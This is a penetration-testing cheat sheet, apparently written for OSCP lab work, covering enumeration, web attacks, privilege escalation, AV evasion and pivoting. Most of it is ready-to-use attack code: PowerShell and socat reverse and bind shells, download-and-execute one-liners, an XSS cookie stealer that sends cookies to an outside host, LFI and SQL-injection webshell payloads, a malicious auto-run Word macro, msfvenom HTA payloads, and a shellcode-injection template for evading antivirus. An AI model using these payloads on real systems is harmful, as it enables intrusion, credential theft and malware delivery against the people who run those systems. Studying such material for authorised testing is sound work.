## General Tips
1) In Wordpress, the Info tab under Tools>Site Health gives a lot of information on the server OS and whatnot
2) In Wordpress, check wp-config.php
3) `wmic service get name,displayname,pathname,startmode | findstr /i "auto"` to check for running services
4) `for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.` ping scan for windows in a loop
5) If there are docker images present, do this `docker run -it -v /:/host/ ubuntu chroot /host/ bash `
6) **On Kali (listen)**:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.221:1235
```

7) `psexec.exe -i -s cmd.exe`  - Escalate from Administrator to SYSTEM
8) `powershell.exe -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://your_ip/powerview.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash.txt"`
9) Pivoting - `sudo ./venv/bin/sshuttle -e "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss" -r j0hn@10.11.1.252:22000 10.2.2.0/24`

### Way to connect to OSCP Machines
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" student@192.168.50.52 -p 2222
```

# Powershell
**File Transfer**
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
wget.exe -V
```

**Reverse Shell**
```
powershell -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.119.157',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

**Bind Shell**
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

**Powercat**
_Listen_
```
sudo nc -lnvp 443 > receiving_powercat.ps1
```

_Send File_
```
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

_Encoded payload_
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

_Run encoded payload_
```
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
```

**DNSRecon**
```
dnsrecon -d megacorpone.com -t axfr
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```

**DNSEnum**
```
dnsenum zonetransfer.me
```

## SMB Enumeration
```
sudo nbtscan -r 10.11.1.0/24
ls -1 /usr/share/nmap/scripts/smb*
nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
```

## NFS Enumeration

```
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
nmap -p 111 --script nfs* 10.11.1.72
```

**Mounting a NFS share**
```
mkdir home
sudo mount -o nolock 10.11.1.72:/home ~/home/
cd home/ && ls
```

## SNMP Enumeration
```
sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
```

**onesixtyone**
```
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
onesixtyone -c community -i ips
```

**snmpwalk**
```
snmpwalk -c public -v1 -t 10 10.11.1.14

Value from MIB Tree (1.3.6..)
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25

```

# Web-Application Pentesting

## XSS
```
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
```

which leads to -

```
kali@kali:~$ sudo nc -nvlp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 41612
GET /report HTTP/1.1
Host: 10.11.0.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.0.22/feedback.php
```

**Notes** - The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in cleartext and captured over the network.

The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

However, even if this flag is not set, we must work around some other browser controls because browser security dictates that cookies set by one domain cannot be sent directly to another domain. As an aside, this can be relaxed for subdomains in the _Set-Cookie_ directive via the _Domain_ and _Path_ flags. As a workaround, if JavaScript can access the cookie value, we can use it as part of a link and send the link, which we could deconstruct to retrieve the cookie value.

**Cookie Stealer**
```
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

## LFI/RFI
**Contaminating Log Files**
```
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

HTTP/1.1 400 Bad Request
```

```
Access the following URL

http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

**PHP Wrappers**
```
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

## SQL Injection
**Check Number of columns**
```
<whatever> order by X
```

**To check for output**
```
<whatever> union all select 1,2 
[if the number of columns is 2]
```

**Enumerate Database Information**
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version

http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()

http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'

```

**SQL Injection to Code Execution**
```
Check if you can do the below
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

```

**SQLMap**
```
sqlmap -u http://192.168.235.10/debug.php?id=1 -p "id" --dbms=mysql --dump

sqlmap -u http://192.168.235.10/debug.php?id=1 -p "id" --dbms=mysql --os-shell

```

## HTA Attack
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

### An example of a malicious Macro
```
Sub AutoOpen()
    Pwned
End Sub

Sub Document_Open()
    Pwned
End Sub

Sub Pwned()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    Str = Str +     Str = Str + "FMAdABhAHIAdAAoACQAcwApADsA"
    ...
    CreateObject("Wscript.Shell").Run Str
    
End Sub

```

We could embed the base64-encoded PowerShell script as a single _String_, but VBA has a 255-character limit for literal strings. This restriction does not apply to strings stored in variables, so we can split the command into multiple lines and concatenate them.

We will use a simple Python script to split our command:

```
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

**Word Objects**

1. Create a batch file and add "START" before the powershell payload (you can get this from msfvenom usinf -f hta-psh directly as a string)
2. Insert this batch file as an object in a word file and change the icon if you will. On clicking, the stuff under the hood runs.

Note - For cases where a file is hosted from the internet, it might be in protected view. While the victim may click _Enable Editing_ and exit Protected View, this is unlikely. Ideally, we would prefer bypassing Protected View altogether, and one straightforward way to do this is to use another Office application.

Like Microsoft Word, Microsoft Publisher allows embedded objects and ultimately code execution in exactly the same manner as Word and Excel, but will not enable Protected View for Internet-delivered documents. We could use the tactics we previously applied to Word to bypass these restrictions, but the downside is that Publisher is less frequently installed than Word or Excel. Still, if your fingerprinting detects an installation of Publisher, this may be a viable and better vector.

## Transferring Files
**VBS HTTP Downloader**
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```

**Powershell HTTP Downloader**
```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.119.173/a.txt" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
Execute Script with
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

**Powershell Upload**
```
systemctl start apache2

powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')

--expect uploads in /var/www/uploads--
```

```Alternate Version
echo $filename = "nc.exe" > upload.ps1
echo $uri = "http://192.168.119.173/upload.php" >> upload.ps1
echo $currentpath = convert-path . >> upload.ps1
echo $filepath = "$currentpath\$filename" >> upload.ps1
echo $filebin = [System.IO.File]::ReadAllText($filepath) >> upload.ps1
echo $boundary = [System.Guid]::NewGuid().ToString() >> upload.ps1
echo $LF = "`r`n" >> upload.ps1
echo $bodylines = ("--$boundary", "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"", "Content-Type: application/octet-stream$LF", $filebin, "--$boundary--$LF") -join $LF >> upload.ps1
echo invoke-webrequest -uri $uri -method post -contenttype "multipart/form-data; boundary=`"$boundary`"" -body $bodylines -usebasicparsing >> upload.ps1

powershell -executionpolicy bypass -nologo -noninteractive -noprofile -file upload.ps1
```

**Powershell One-Liner**
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.173/a.txt', 'a.txt')

powershell.exe Invoke-WebRequest 'http://192.168.119.173/37292.c' -OutFile exploit.c
```

**Compress files**
```
upx -9 nc.exe
```

## AV Evasion

### You also have Veil and Shellter for AV Evasion

```Basic Template for In-Memory Injection
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

**Note -**
Once we execute the file, we are presented with the default WinRAR installation window, which will install the software normally without any issues. Looking back at our handler shows that we successfully received a Meterpreter session but the session appears to die after the installation either finishes or is cancelled:

```
[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Meterpreter session 3 opened (10.11.0.4:4444 -> 10.11.0.22:51367)

meterpreter > 
[*] 10.11.0.22 - Meterpreter session 3 closed.  Reason: Died
```

> Listing 17 - Receiving the meterpreter session

This makes sense because the installer execution has completed and the process has been terminated. In order to overcome this problem, we can set up an _AutoRunScript_ to migrate our Meterpreter to a separate process immediately after session creation. If we re-run the WinRAR setup file after this change to our listener instance, we should receive a different result:

```
msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate

msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.11.0.4:4444 
[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Meterpreter session 4 opened (10.11.0.4:4444 -> 10.11.0.22:51371)
[*] Session ID 4 (10.11.0.4:4444 -> 10.11.0.22:51371) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against DESKTOP-T27O4CT
[*] Current server process: wrar550.exe (4036)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 4832
[+] Successfully migrated to process 4832

meterpreter > getuid
Server username: DESKTOP-T27O4CT\offsec
```

## Privilege Escalation
**OS Information on Windows**
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
**OS Information on Linux**
```
cat /etc/*-release
uname -a
```
**Process List on Windows**
```
tasklist /SVC
```
**Process List on Linux**
```
ps axu
lsof -i:21 (Process Information port wise)
```
**Network Info on Windows**
```
ipconfig /all
route print
```
**Network Info on Linux**
```
netstat -ano
ss -tulpn | grep "LISTEN"
ss -anp
/sbin/route
```
**Firewall Information on Windows**
```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```
**Scheduled Tasks**
```
schtasks /query /fo LIST /v (Windows)
ls -lah /etc/cron* (Linux)
cat /etc/crontab (Linux)
```
**Installed Applications on WIndows**
```
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn (System-wide updates)
```
**Installed Applications on Linux**
```
dpkg -l
```
**Enumerating Readable/Writable Files and Directories**
```
**Windows**
(FROM SYSINTERNALS)
accesschk.exe -uws "Everyone" "C:\Program Files"
[-u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search.]

(FROM POWERSHELL)
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
[Drivers Loaded]

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
[More information on the Driver]

**Linux**
find / -writable -type d 2>/dev/null
mountvol or cat /etc/fstab  or mount(list of volumes)
/bin/lsblk (all available disks)
lsmod [Loaded kernel modules]
/sbin/modinfo libata (Info on modules)
```

#### Enumerating Binaries That AutoElevate
First, on Windows systems, we should check the status of the _AlwaysInstallElevated_[48](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/privilege-escalation/information-gathering/manual-enumeration#fn48) registry setting. If this key is enabled (set to _1_) in either _HKEY_CURRENT_USER_ or _HKEY_LOCAL_MACHINE_, any user can run Windows Installer packages with elevated privileges.
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```
**Linux**
```
Find SUID Files
find / -perm -u=s -type f 2>/dev/null
find / -perm /04000 -type f 2>/dev/null
```

**Powershell raising the Integrity level of a process**
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

## Port Forwarding
**The most useful way**
```
Windows Client to Kali VM (to connect to Windows Server only available on Windows Client subnet)

plink.exe -N -L 0.0.0.0:4444:<IP>:4444 kali@<ip>
```

**Local Port Forwarding**
```
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
```
In this case, 0.0.0.0 represents our own host trying to port forward its own port 445 to a Windows Server's (only accessible from 10.11.0.128 the linux client) port 445 in order to access the SMB shares on Windows on our own host directly

**Remote Port Forwarding**
```
ssh -N -R 192.168.119.153:1234:127.0.0.1:3306 root@192.168.119.153
```
In this case, we start from a compromised client (127.0.0.1). We see that there is a MySQL server but we dont have SSH access. We got in through a web shell or something. So we SSH towards our Kali System (192.168.119.153) on a port higher than 1024 (here its 1234). If successfull, we run an Nmap scan against port 1234 in localhost of Kali. 

**Dynamic Port Forwarding**
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -N -D 127.0.0.1:1234 student@192.168.153.44
```
Here, we connect to the Linux client using a SOCKS4 proxy and port forward locally on 1234. We also edit /etc/proxychains4.conf and add a line "socks4 127.0.0.1 1234"

**Plink.exe (From Windows Shell to Kali)**
```
plink.exe -ssh -l kali -pw kali -R 192.168.119.153:1234:127.0.0.1:3306 192.168.119.153
```

**Netsh (Windows Server to Client. Access via Kali)**

1) First make a proxy from the Server to Client (Client is 10.11.0.22)
```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
```

2) Then make a firewall rule allowing inbound connections to the port you will use to connect from Kali
```
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```

3) For windows, mount in this way
```
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o sec=ntlmsspi,username=Administrator,password=Qwerty09! /mnt/win10_share
```